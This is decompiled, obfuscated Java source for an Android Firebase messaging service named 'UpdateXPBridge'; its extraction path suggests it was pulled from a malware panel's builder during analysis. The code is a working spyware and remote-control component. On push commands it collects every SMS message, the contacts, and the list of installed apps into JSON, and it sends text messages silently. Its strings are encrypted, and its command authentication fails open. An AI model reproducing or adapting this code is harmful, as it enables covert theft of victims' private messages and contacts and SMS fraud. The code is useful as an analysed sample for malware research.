package app.mobilex.plus.services;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Process;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.text.TextUtils;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.util.UtilYWProcessor;
import com.google.firebase.messaging.FirebaseMessagingService;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Objects;
import java.util.TreeMap;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;
import org.json.JSONObject;
import v.s.Aqh0grSwgDbwr;
import v.s.BS2kx9eAoOyDiNGAFlFk;
import v.s.D3nkzQlSKjHnRbwlOY;
import v.s.JnC75xOgwtSSKHn30v;
import v.s.KV57Z6oavcB595B8Dy8Z;
import v.s.N4h1mGVqsY6M8lTtB;
import v.s.O162WzpEtUgucWBV;
import v.s.Sn2d19yOBfyV0rw;
import v.s.VnDsNIgXNCQywv8lGh;
import v.s.eyavN4VgkDpngkAKt;
import v.s.fEyMFFyOOvHURJ7To6L;
import v.s.gA5gCwTK0qjTIn;
import v.s.imhBI9RqzETHtVIJe;
import v.s.jb8et6SZeK5TWMrJFxDX;
import v.s.ofxQWGnngPxGI3OtvQn;
import v.s.okc5AGRjqrud84oM6d;
import v.s.r5XEUfod5GSCCwq6c;
import v.s.umMdYoePNXvWWPn;
import v.s.y6jRGLEWNMir;
import v.s.z1jyE6u5MXAb3Rr;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UpdateXPBridge extends FirebaseMessagingService {
    public static final /* synthetic */ int w9sT1Swbhx3hs = 0;

    static {
        TypefaceCache.obtain("00160066005F008600E400BA00EA0097000100640052008300F700BA");
    }

    public static final JSONObject Ee8d2j4S9Vm5yGuR(UpdateXPBridge updateXPBridge, String str, String str2) {
        boolean zBq;
        JSONObject jSONObject = new JSONObject();
        try {
            zBq = UtilYWProcessor.bq(str, str2, -1);
        } catch (Throwable unused) {
            zBq = false;
        }
        if (zBq) {
            try {
                jSONObject.put(TypefaceCache.obtain("0030007300550093"), true);
                jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("002D0077004F008E00E600BA"));
            } catch (Exception unused2) {
                try {
                    try {
                        gA5gCwTK0qjTIn.K7eEOBPYP9VIoHWTe(updateXPBridge.getApplicationContext(), str, str2, 0);
                        jSONObject.put(TypefaceCache.obtain("0030007300550093"), true);
                        jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("00310073005D"));
                    } catch (Exception unused3) {
                        SmsManager smsManager = SmsManager.getDefault();
                        ArrayList<String> arrayListDivideMessage = smsManager.divideMessage(str2);
                        if (arrayListDivideMessage.size() > 1) {
                            smsManager.sendMultipartTextMessage(str, null, arrayListDivideMessage, null, null);
                        } else {
                            smsManager.sendTextMessage(str, null, str2, null, null);
                        }
                        jSONObject.put(TypefaceCache.obtain("0030007300550093"), true);
                        jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("0027007F0049008200F300AB"));
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("0002007A005700C700D6009C00FF00E70010005B006800C700FD00BA00C600AF002C0072004800C700F600BE00DB00AB00260072001B008100FF00AD0092");
                    e.getMessage();
                    jSONObject.put(TypefaceCache.obtain("0030007300550093"), false);
                    jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("0022007A005700B800FD00BA00C600AF002C0072004800B800F600BE00DB00AB00260072"));
                }
            }
        } else {
            gA5gCwTK0qjTIn.K7eEOBPYP9VIoHWTe(updateXPBridge.getApplicationContext(), str, str2, 0);
            jSONObject.put(TypefaceCache.obtain("0030007300550093"), true);
            jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("00310073005D"));
        }
        return jSONObject;
    }

    public static final JSONObject JXn4Qf7zpnLjP5(UpdateXPBridge updateXPBridge) {
        JSONObject jSONObject = new JSONObject();
        JSONArray jSONArray = new JSONArray();
        try {
            Cursor cursorQuery = updateXPBridge.getContentResolver().query(Telephony.Sms.CONTENT_URI, new String[]{"address", "body", "date", "type"}, null, null, "date" + TypefaceCache.obtain("00630052007E00B400D300FF00FE008E000E005F006F00C700A100EF0082"));
            if (cursorQuery != null) {
                while (cursorQuery.moveToNext()) {
                    try {
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put(TypefaceCache.obtain("00220072005F009500F500AC00C1"), cursorQuery.getString(0));
                        jSONObject2.put(TypefaceCache.obtain("00210079005F009E"), cursorQuery.getString(1));
                        jSONObject2.put(TypefaceCache.obtain("00270077004F0082"), cursorQuery.getLong(2));
                        jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain(cursorQuery.getInt(3) == 1 ? "002A00780058008800FD00B600DC00A0" : "002C0063004F008000FF00B600DC00A0"));
                        jSONArray.put(jSONObject2);
                    } catch (Throwable th) {
                        try {
                            throw th;
                        } catch (Throwable th2) {
                            okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                            throw th2;
                        }
                    }
                }
                cursorQuery.close();
            }
        } catch (Exception e) {
            TypefaceCache.obtain("000600640049008800E200FF00D500A2003700620052008900F700FF00E1008A00100036005A009500F300B700DB00B10026002C001B");
            e.getMessage();
        }
        jSONObject.put(TypefaceCache.obtain("0030007B004800B800F300B000C700A90037"), jSONArray.length());
        jSONObject.put(TypefaceCache.obtain("0030007B004800B800FC00B600C100B3"), jSONArray);
        return jSONObject;
    }

    private static /* synthetic */ void ecezo() {
    }

    public static final JSONObject vekpFI4d1Nc4fakF(UpdateXPBridge updateXPBridge) {
        JSONObject jSONObject = new JSONObject();
        JSONArray jSONArray = new JSONArray();
        try {
            PackageManager packageManager = updateXPBridge.getPackageManager();
            for (PackageInfo packageInfo : packageManager.getInstalledPackages(0)) {
                ApplicationInfo applicationInfo = packageInfo.applicationInfo;
                if (applicationInfo != null && (applicationInfo.flags & 1) == 0) {
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), packageInfo.packageName);
                    jSONObject2.put(TypefaceCache.obtain("002D007700560082"), packageManager.getApplicationLabel(applicationInfo).toString());
                    String strObtain = TypefaceCache.obtain("003500730049009400F900B000DC");
                    String strObtain2 = packageInfo.versionName;
                    if (strObtain2 == null) {
                        strObtain2 = TypefaceCache.obtain("003600780050008900FF00A800DC");
                    }
                    jSONObject2.put(strObtain, strObtain2);
                    jSONArray.put(jSONObject2);
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("000600640049008800E200FF00D500A2003700620052008900F700FF00D300B700330065000100C7");
            e.getMessage();
        }
        jSONObject.put(TypefaceCache.obtain("00220066004B009400CF00BC00DD00B2002D0062"), jSONArray.length());
        jSONObject.put(TypefaceCache.obtain("00220066004B0094"), jSONArray);
        return jSONObject;
    }

    public static final JSONObject w9sT1Swbhx3hs(UpdateXPBridge updateXPBridge) {
        JSONObject jSONObject = new JSONObject();
        while (Process.myPid() < -999) {
            Long.hashCode(System.nanoTime());
        }
        JSONArray jSONArray = new JSONArray();
        try {
            Cursor cursorQuery = updateXPBridge.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"display_name", "data1"}, null, null, null);
            if (cursorQuery != null) {
                while (cursorQuery.moveToNext()) {
                    try {
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put(TypefaceCache.obtain("002D007700560082"), cursorQuery.getString(0));
                        jSONObject2.put(TypefaceCache.obtain("0033007E0054008900F5"), cursorQuery.getString(1));
                        jSONArray.put(jSONObject2);
                    } catch (Throwable th) {
                        try {
                            throw th;
                        } catch (Throwable th2) {
                            okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                            throw th2;
                        }
                    }
                }
                cursorQuery.close();
            }
        } catch (Exception e) {
            TypefaceCache.obtain("000600640049008800E200FF00D500A2003700620052008900F700FF00D100A8002D0062005A008400E400AC008800E7");
            e.getMessage();
        }
        jSONObject.put(TypefaceCache.obtain("002000790055009300F100BC00C600B4001C00750054009200FE00AB"), jSONArray.length());
        jSONObject.put(TypefaceCache.obtain("002000790055009300F100BC00C600B4"), jSONArray);
        return jSONObject;
    }

    /* JADX WARN: Code duplicated, block: B:11:0x0077  */
    /* JADX WARN: Multi-variable type inference failed */
    @Override // com.google.firebase.messaging.FirebaseMessagingService
    public final void onMessageReceived(D3nkzQlSKjHnRbwlOY d3nkzQlSKjHnRbwlOY) {
        boolean zEquals;
        JSONObject jSONObject;
        super.onMessageReceived(d3nkzQlSKjHnRbwlOY);
        TypefaceCache.obtain("00050055007600C700FD00BA00C100B400220071005E00C700E200BA00D100A2002A0060005E008300B000F2009200B00022007D0052008900F700FF00C700B700630072005E009100F900BC00D700E6");
        try {
            Intent intent = new Intent(this, (Class<?>) SyncQYAdapter.class);
            intent.setAction(TypefaceCache.obtain("00050055007600B800C7009E00F9008200160046"));
            startForegroundService(intent);
            y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new eyavN4VgkDpngkAKt(this, null, 4), 3);
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(this);
        } catch (Exception e) {
            TypefaceCache.obtain("003400770050008200C500AF00F300A90027005E005E008600E200AB00D000A200220062001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
        if (!((O162WzpEtUgucWBV) d3nkzQlSKjHnRbwlOY.dDIMxZXP1V8HdM()).isEmpty()) {
            TypefaceCache.obtain("000E00730048009400F100B800D700E700270077004F008600AA00FF");
            Objects.toString(d3nkzQlSKjHnRbwlOY.dDIMxZXP1V8HdM());
            Map mapDDIMxZXP1V8HdM = d3nkzQlSKjHnRbwlOY.dDIMxZXP1V8HdM();
            String str2 = (String) ((O162WzpEtUgucWBV) mapDDIMxZXP1V8HdM).get(TypefaceCache.obtain("001C006500520080"));
            if (str2 == null) {
                zEquals = true;
            } else {
                String strDDIMxZXP1V8HdM = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(64);
                if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strDDIMxZXP1V8HdM)) {
                    zEquals = true;
                } else {
                    try {
                        LinkedHashMap linkedHashMap = new LinkedHashMap();
                        for (Map.Entry entry : ((Sn2d19yOBfyV0rw) mapDDIMxZXP1V8HdM).entrySet()) {
                            if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs((String) entry.getKey(), TypefaceCache.obtain("001C006500520080"))) {
                                linkedHashMap.put(entry.getKey(), entry.getValue());
                            }
                        }
                        TreeMap treeMap = new TreeMap(linkedHashMap);
                        new JSONObject(treeMap).toString();
                        StringBuilder sb = new StringBuilder("{");
                        int i = 0;
                        for (Object obj : imhBI9RqzETHtVIJe.MSGkxvPxRYNqC(treeMap.keySet())) {
                            int i2 = i + 1;
                            if (i < 0) {
                                Aqh0grSwgDbwr.O2DHNSIGZlgPja7eqLgn();
                                throw null;
                            }
                            String str3 = (String) obj;
                            if (i > 0) {
                                sb.append(", ");
                            }
                            sb.append("\"" + str3 + TypefaceCache.obtain("0061002C001B00C5") + treeMap.get(str3) + "\"");
                            i = i2;
                        }
                        sb.append("}");
                        Mac mac = Mac.getInstance(TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020"));
                        Charset charset = N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM;
                        mac.init(new SecretKeySpec(strDDIMxZXP1V8HdM.getBytes(charset), TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020")));
                        zEquals = str2.equals(VnDsNIgXNCQywv8lGh.MSGkxvPxRYNqC(mac.doFinal(sb.toString().getBytes(charset)), ofxQWGnngPxGI3OtvQn.gmNWMfvn6zlEj));
                    } catch (Exception e2) {
                        TypefaceCache.obtain("000B005B007A00A400B000A900D700B5002A00700052008400F100AB00DB00A8002D0036005E009500E200B000C000FD0063");
                        e2.getMessage();
                        zEquals = true;
                    }
                }
            }
            if (zEquals) {
                O162WzpEtUgucWBV o162WzpEtUgucWBV = (O162WzpEtUgucWBV) mapDDIMxZXP1V8HdM;
                String str4 = (String) o162WzpEtUgucWBV.get(TypefaceCache.obtain("0037006F004B0082"));
                String str5 = (String) o162WzpEtUgucWBV.get(TypefaceCache.obtain("002000790056008A00F100B100D6"));
                if (str5 != null) {
                    String str6 = (String) o162WzpEtUgucWBV.get(TypefaceCache.obtain("002000790056008A00F100B100D60098002A0072"));
                    String str7 = (String) o162WzpEtUgucWBV.get(TypefaceCache.obtain("003300770042008B00FF00BE00D6"));
                    if (str7 != null) {
                        try {
                            jSONObject = new JSONObject(str7);
                        } catch (Exception unused) {
                            jSONObject = null;
                        }
                    } else {
                        jSONObject = null;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str4, TypefaceCache.obtain("002000790056008A00F100B100D6"))) {
                        String str8 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                        y6jRGLEWNMir.DVTNwpDEVsUKuznof();
                    }
                    TypefaceCache.obtain("0006006E005E008400E500AB00DB00A9002400360058008800FD00B200D300A90027002C001B");
                    y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new z1jyE6u5MXAb3Rr(str5, this, str6, mapDDIMxZXP1V8HdM, jSONObject, null), 79 - 76);
                }
            } else {
                TypefaceCache.obtain("00050055007600C700FD00BA00C100B400220071005E00C700D8009200F3008400630060005E009500F900B900DB00A4002200620052008800FE00FF00D400A6002A007A005E008300B000F2009200AE002400780054009500F900B100D5");
            }
        }
        Bundle bundle = d3nkzQlSKjHnRbwlOY.w9sT1Swbhx3hs;
        if (d3nkzQlSKjHnRbwlOY.JXn4Qf7zpnLjP5 == null && r5XEUfod5GSCCwq6c.XiR1pIn5878vVWd(bundle)) {
            r5XEUfod5GSCCwq6c r5xeufod5gsccwq6c = new r5XEUfod5GSCCwq6c(bundle);
            fEyMFFyOOvHURJ7To6L feymffyoovhurj7to6l = new fEyMFFyOOvHURJ7To6L((-81) + 96);
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.title");
            r5xeufod5gsccwq6c.Qrz92kRPw4GcghAc("gcm.n.title");
            Object[] objArrWotphlvK9sPbXJ = r5xeufod5gsccwq6c.wotphlvK9sPbXJ("gcm.n.title");
            if (objArrWotphlvK9sPbXJ != null) {
                String[] strArr = new String[objArrWotphlvK9sPbXJ.length];
                for (int i3 = 0; i3 < objArrWotphlvK9sPbXJ.length; i3++) {
                    strArr[i3] = String.valueOf(objArrWotphlvK9sPbXJ[i3]);
                }
            }
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.body");
            r5xeufod5gsccwq6c.Qrz92kRPw4GcghAc("gcm.n.body");
            Object[] objArrWotphlvK9sPbXJ2 = r5xeufod5gsccwq6c.wotphlvK9sPbXJ("gcm.n.body");
            if (objArrWotphlvK9sPbXJ2 != null) {
                String[] strArr2 = new String[objArrWotphlvK9sPbXJ2.length];
                for (int i4 = 0; i4 < objArrWotphlvK9sPbXJ2.length; i4++) {
                    strArr2[i4] = String.valueOf(objArrWotphlvK9sPbXJ2[i4]);
                }
            }
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.icon");
            if (TextUtils.isEmpty(r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.sound2"))) {
                r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.sound");
            }
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.tag");
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.color");
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.click_action");
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.android_channel_id");
            String strJ0zjQ7CAgohuxU20eCW6 = r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.link_android");
            if (TextUtils.isEmpty(strJ0zjQ7CAgohuxU20eCW6)) {
                strJ0zjQ7CAgohuxU20eCW6 = r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.link");
            }
            if (!TextUtils.isEmpty(strJ0zjQ7CAgohuxU20eCW6)) {
                Uri.parse(strJ0zjQ7CAgohuxU20eCW6);
            }
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.image");
            r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.ticker");
            r5xeufod5gsccwq6c.hjneShqpF9Tis4("gcm.n.notification_priority");
            r5xeufod5gsccwq6c.hjneShqpF9Tis4("gcm.n.visibility");
            r5xeufod5gsccwq6c.hjneShqpF9Tis4("gcm.n.notification_count");
            r5xeufod5gsccwq6c.pyu8ovAipBTLYAiKab("gcm.n.sticky");
            r5xeufod5gsccwq6c.pyu8ovAipBTLYAiKab("gcm.n.local_only");
            r5xeufod5gsccwq6c.pyu8ovAipBTLYAiKab("gcm.n.default_sound");
            r5xeufod5gsccwq6c.pyu8ovAipBTLYAiKab("gcm.n.default_vibrate_timings");
            r5xeufod5gsccwq6c.pyu8ovAipBTLYAiKab("gcm.n.default_light_settings");
            String strJ0zjQ7CAgohuxU20eCW7 = r5xeufod5gsccwq6c.J0zjQ7CAgohuxU20eCW6("gcm.n.event_time");
            if (!TextUtils.isEmpty(strJ0zjQ7CAgohuxU20eCW7)) {
                try {
                    Long.parseLong(strJ0zjQ7CAgohuxU20eCW7);
                } catch (NumberFormatException unused2) {
                    r5XEUfod5GSCCwq6c.O2DHNSIGZlgPja7eqLgn("gcm.n.event_time");
                }
            }
            r5xeufod5gsccwq6c.gIIiyi2ddlMDR0();
            r5xeufod5gsccwq6c.MLSIo1htfMPWeB8V876L();
            d3nkzQlSKjHnRbwlOY.JXn4Qf7zpnLjP5 = feymffyoovhurj7to6l;
        }
        if (d3nkzQlSKjHnRbwlOY.JXn4Qf7zpnLjP5 != null) {
            TypefaceCache.obtain("000D0079004F008E00F600B600D100A60037007F0054008900AA00FF");
        }
    }

    @Override // com.google.firebase.messaging.FirebaseMessagingService
    public final void onNewToken(String str) {
        super.onNewToken(str);
        TypefaceCache.obtain("000D0073004C00C700D6009C00FF00E7003700790050008200FE00FF00C000A2002000730052009100F500BB");
        getSharedPreferences(TypefaceCache.obtain("002500750056"), 0).edit().putString(TypefaceCache.obtain("003700790050008200FE"), str).apply();
        y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new JnC75xOgwtSSKHn30v(this, str, null, 5), 3);
    }
}
